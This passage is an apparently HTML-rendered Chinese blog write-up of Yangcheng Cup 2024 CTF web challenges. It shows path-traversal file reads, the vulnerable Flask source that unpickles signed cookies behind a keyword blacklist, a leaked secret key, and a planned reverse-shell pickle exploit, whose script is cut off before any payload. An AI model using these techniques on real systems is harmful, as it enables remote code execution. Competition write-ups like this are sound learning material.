@@ -1,0 +1,1488 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="/images/favicon.ico">
+  
+  <title>羊城杯2024web方向题解与复现 | Err0r233</title>
+  <meta name="author" content="Err0r2333" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="Web" />
+  
+  <meta name="description" content="8.27偶遇粤港澳大湾区羊城杯，全是知识盲区强如战神，拼尽全力无法战胜。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="羊城杯2024web方向题解与复现">
+<meta property="og:url" content="http://example.com/posts/3830.html">
+<meta property="og:site_name" content="Err0r233">
+<meta property="og:description" content="8.27偶遇粤港澳大湾区羊城杯，全是知识盲区强如战神，拼尽全力无法战胜。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/favicon.ico">
+<meta property="article:published_time" content="2024-08-31T17:07:25.000Z">
+<meta property="article:modified_time" content="2024-09-09T10:58:26.760Z">
+<meta property="article:author" content="Err0r2333">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/favicon.ico">
+<meta name="twitter:site" content="@Err0r2333">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all"></script>
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)"></script>
+    <script src="/js/kr-dark.min.js"></script>
+  
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" media="all"></script>
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></script>
+  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"></script>
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('/images/banner3.png');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/bg_winter.jpg');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Err0r233" type="application/atom+xml">
+</head>
+
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                    
+                                        
+                                            <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/friends/"><i class="fa fa-paw"></i>好伙伴</a></li>
+                                        
+                                    
+                                        
+                                            <li>
+                                                <a><i class="fa fa-link"></i>链接</a>
+                                                <ul class="sub-menu">
+                                                    
+                                                        
+                                                    
+                                                </ul>
+                                            </li>
+                                        
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">Err0r233</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>Err0r233</h2> <br />
+                        <span>Err0r233的个人博客</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article itemscope itemtype="https://schema.org/Article">
+    
+    <link itemprop="mainEntityOfPage" href="http://example.com/posts/3830.html">
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center" itemprop="name headline">羊城杯2024web方向题解与复现</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><time datetime="2024-08-31T17:07:25.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2024-09-01</time></li>
+                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
+                    <i class="fa fa-user"></i> 作者 <span itemprop="name">Err0r2333</span>
+                </li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~49.92K
+                    
+                    字
+                </li>
+                
+                    <li id="/posts/3830.html" class="leancloud_visitors" data-flag-title="羊城杯2024web方向题解与复现">
+                        <i class="fa fa-eye"></i>
+                        <span class="leancloud-visitors-count"> </span> 次阅读
+                    </li>
+                    
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                <div class="icon"><i class="fa fa-warning"></i></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1725879506760"></time> 前，其中的内容可能需要更新。</p></div>
+            </div>
+            
+            
+            
+            <hr />
+            <div itemprop="articleBody"><p>8.27偶遇粤港澳大湾区羊城杯，全是知识盲区强如战神，拼尽全力无法战胜。</p>
+<span id="more"></span>
+<p>还是太菜了，这里给出官方的羊城杯复现环境：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">赛题复现环境：</span><br><span class="line">PWN-xlogger：139.155.126.78:36422</span><br><span class="line">PWN-xhttpd： 139.155.126.78:33002</span><br><span class="line">PWN-xtravel：139.155.126.78:39702</span><br><span class="line">PWN-xpstack： 139.155.126.78:35475</span><br><span class="line">WEB-ez_java：139.155.126.78:34007 </span><br><span class="line">WEB-Lyrics For You： 139.155.126.78:33899</span><br><span class="line">WEB-tomtom2：139.155.126.78:33157</span><br><span class="line">WEB-网络照相馆：139.155.126.78:32201</span><br><span class="line">WEB-tomtom2_revenge： 139.155.126.78:37596</span><br><span class="line">DS-data-analy1：139.155.126.78:38467</span><br><span class="line">DS-data-analy2：139.155.126.78:31076</span><br><span class="line">DS-data-analy3：139.155.126.78:34321</span><br></pre></td></tr></table></figure>
+<p>锐评一下web，出的都很有意思，ez_java我觉得挺好玩，但是也挺折磨的，当时没打通，放置了半个晚上回去用同样的payload打通了，百思不得其解。lyrics for you 这题还行，学弟们做的七七八八，我负责收尾工作写payload。 tomtom2和他的revenge题没有怎么看，因为前面说了被ez_java卡了半个晚上。拼尽全力制作出它的非预期解，这两题都出在我的知识盲点上了，比较可以拿来学习。照相馆根本没看，故不做评价，除了非预期比较难绷。</p>
+<h1><span id="lyrics-for-you"> Lyrics for you</span></h1>
+<img src="/posts/undefined/1.png" class title="awa">
+<p>发现似乎是直接读文件，尝试任意文件读取：</p>
+<img src="/posts/undefined/2.png" class title="awa">
+<p>可行，尝试读flag：</p>
+<img src="/posts/undefined/3.png" class title="awa">
+<p>不行，换个思路读app，我们要知道app运行在了哪个地方，先读<code>/proc/1/cmdline</code></p>
+<img src="/posts/undefined/4.png" class title="awa">
+<p><a target="_blank" rel="noopener" href="http://xn--app-7j2e055x.py">读到app.py</a>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> config.secret_key <span class="keyword">import</span> secret_code</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response, request, render_template</span><br><span class="line"><span class="keyword">from</span> cookie <span class="keyword">import</span> set_cookie, cookie_check, get_cookie</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = random.randbytes(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserData</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username</span>):</span><br><span class="line">        self.username = username</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Waf</span>(<span class="params">data</span>):</span><br><span class="line">    blacklist = [<span class="string">b&#x27;R&#x27;</span>, <span class="string">b&#x27;secret&#x27;</span>, <span class="string">b&#x27;eval&#x27;</span>, <span class="string">b&#x27;file&#x27;</span>, <span class="string">b&#x27;compile&#x27;</span>, <span class="string">b&#x27;open&#x27;</span>, <span class="string">b&#x27;os.popen&#x27;</span>]</span><br><span class="line">    valid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> word.lower() <span class="keyword">in</span> data.lower():</span><br><span class="line">            valid = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> valid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/lyrics&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lyrics</span>():</span><br><span class="line">    resp = make_response()</span><br><span class="line">    resp.headers[<span class="string">&quot;Content-Type&quot;</span>] = <span class="string">&#x27;text/plain; charset=UTF-8&#x27;</span></span><br><span class="line">    query = request.args.get(<span class="string">&quot;lyrics&quot;</span>)</span><br><span class="line">    path = os.path.join(os.getcwd() + <span class="string">&quot;/lyrics&quot;</span>, query)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(path) <span class="keyword">as</span> f:</span><br><span class="line">            res = f.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No lyrics found&quot;</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        user = UserData(username)</span><br><span class="line">        res = &#123;<span class="string">&quot;username&quot;</span>: user.username&#125;</span><br><span class="line">        <span class="keyword">return</span> set_cookie(<span class="string">&quot;user&quot;</span>, res, secret=secret_code)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/board&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">board</span>():</span><br><span class="line">    invalid = cookie_check(<span class="string">&quot;user&quot;</span>, secret=secret_code)</span><br><span class="line">    <span class="keyword">if</span> invalid:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Nope, invalid code get out!&quot;</span></span><br><span class="line"></span><br><span class="line">    data = get_cookie(<span class="string">&quot;user&quot;</span>, secret=secret_code)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">bytes</span>):</span><br><span class="line">        a = pickle.loads(data)</span><br><span class="line">        data = <span class="built_in">str</span>(data, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;user.html&#x27;</span>, name=<span class="string">&quot;guest&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> data[<span class="string">&quot;username&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>, name=data[<span class="string">&quot;username&quot;</span>])</span><br><span class="line">    <span class="keyword">if</span> data[<span class="string">&quot;username&quot;</span>] != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;user.html&#x27;</span>, name=data[<span class="string">&quot;username&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    os.chdir(os.path.dirname(__file__))</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>
+<p>关键逻辑就是/board，能进行一个pickle，pickle存在了cookie里，并且对cookie进行了check。这里本地<code>pip install</code>没有找到<code>cookie</code>这个<code>module</code>，可以推测cookie是自己写的一个实现。查看<code>cookie.py</code>：</p>
+<img src="/posts/undefined/5.png" class title="awa">
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> make_response, request</span><br><span class="line"></span><br><span class="line">unicode = <span class="built_in">str</span></span><br><span class="line">basestring = <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Quoted from python bottle template, thanks :D</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_encode</span>(<span class="params">data, key</span>):</span><br><span class="line">    msg = base64.b64encode(pickle.dumps(data, -<span class="number">1</span>))</span><br><span class="line">    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())</span><br><span class="line">    <span class="keyword">return</span> tob(<span class="string">&#x27;!&#x27;</span>) + sig + tob(<span class="string">&#x27;?&#x27;</span>) + msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_decode</span>(<span class="params">data, key</span>):</span><br><span class="line">    data = tob(data)</span><br><span class="line">    <span class="keyword">if</span> cookie_is_encoded(data):</span><br><span class="line">        sig, msg = data.split(tob(<span class="string">&#x27;?&#x27;</span>), <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> _lscmp(sig[<span class="number">1</span>:], base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())):</span><br><span class="line">            <span class="keyword">return</span> pickle.loads(base64.b64decode(msg))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">data</span>):</span><br><span class="line">    blacklist = [<span class="string">b&#x27;R&#x27;</span>, <span class="string">b&#x27;secret&#x27;</span>, <span class="string">b&#x27;eval&#x27;</span>, <span class="string">b&#x27;file&#x27;</span>, <span class="string">b&#x27;compile&#x27;</span>, <span class="string">b&#x27;open&#x27;</span>, <span class="string">b&#x27;os.popen&#x27;</span>]</span><br><span class="line">    valid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> word <span class="keyword">in</span> data:</span><br><span class="line">            valid = <span class="literal">True</span></span><br><span class="line">            <span class="comment"># print(word)</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> valid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_check</span>(<span class="params">key, secret=<span class="literal">None</span></span>):</span><br><span class="line">    a = request.cookies.get(key)</span><br><span class="line">    data = tob(request.cookies.get(key))</span><br><span class="line">    <span class="keyword">if</span> data:</span><br><span class="line">        <span class="keyword">if</span> cookie_is_encoded(data):</span><br><span class="line">            sig, msg = data.split(tob(<span class="string">&#x27;?&#x27;</span>), <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> _lscmp(sig[<span class="number">1</span>:], base64.b64encode(hmac.new(tob(secret), msg, digestmod=hashlib.md5).digest())):</span><br><span class="line">                res = base64.b64decode(msg)</span><br><span class="line">                <span class="keyword">if</span> waf(res):</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tob</span>(<span class="params">s, enc=<span class="string">&#x27;utf8&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">return</span> s.encode(enc) <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, unicode) <span class="keyword">else</span> <span class="built_in">bytes</span>(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookie</span>(<span class="params">key, default=<span class="literal">None</span>, secret=<span class="literal">None</span></span>):</span><br><span class="line">    value = request.cookies.get(key)</span><br><span class="line">    <span class="keyword">if</span> secret <span class="keyword">and</span> value:</span><br><span class="line">        dec = cookie_decode(value, secret)</span><br><span class="line">        <span class="keyword">return</span> dec[<span class="number">1</span>] <span class="keyword">if</span> dec <span class="keyword">and</span> dec[<span class="number">0</span>] == key <span class="keyword">else</span> default</span><br><span class="line">    <span class="keyword">return</span> value <span class="keyword">or</span> default</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_is_encoded</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bool</span>(data.startswith(tob(<span class="string">&#x27;!&#x27;</span>)) <span class="keyword">and</span> tob(<span class="string">&#x27;?&#x27;</span>) <span class="keyword">in</span> data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_lscmp</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">not</span> <span class="built_in">sum</span>(<span class="number">0</span> <span class="keyword">if</span> x == y <span class="keyword">else</span> <span class="number">1</span> <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)) <span class="keyword">and</span> <span class="built_in">len</span>(a) == <span class="built_in">len</span>(b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_cookie</span>(<span class="params">name, value, secret=<span class="literal">None</span>, **options</span>):</span><br><span class="line">    <span class="keyword">if</span> secret:</span><br><span class="line">        value = touni(cookie_encode((name, value), secret))</span><br><span class="line">        resp = make_response(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        resp.set_cookie(<span class="string">&quot;user&quot;</span>, value, max_age=<span class="number">3600</span>)</span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(value, basestring):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&#x27;Secret key missing for non-string Cookie.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(value) &gt; <span class="number">4096</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Cookie value to long.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">touni</span>(<span class="params">s, enc=<span class="string">&#x27;utf8&#x27;</span>, err=<span class="string">&#x27;strict&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">return</span> s.decode(enc, err) <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>) <span class="keyword">else</span> unicode(s)</span><br></pre></td></tr></table></figure>
+<p>有了源码之后我们就能够自定义cookie了，关键就是secret在哪。</p>
+<p>可以看到app.py里的secret_code是从<code>config.secret_key</code>里导入的，可以得出路径在<code>/usr/etc/app/config/secret_key.py</code>里：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secret_code = &quot;EnjoyThePlayTime123456&quot;</span><br></pre></td></tr></table></figure>
+<img src="/posts/undefined/6.png" class title="awa">
+<p>接下来只需要按照cookie.py里的加密逻辑加密我们的pickle即可，由于无回显，打反弹shell，记得waf过滤了<code>R</code>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> make_response, request</span><br><span class="line"></span><br><span class="line">unicode = <span class="built_in">str</span></span><br><span class="line">basestring = <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Quoted from python bottle template, thanks :D</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_encode</span>(<span class="params">data, 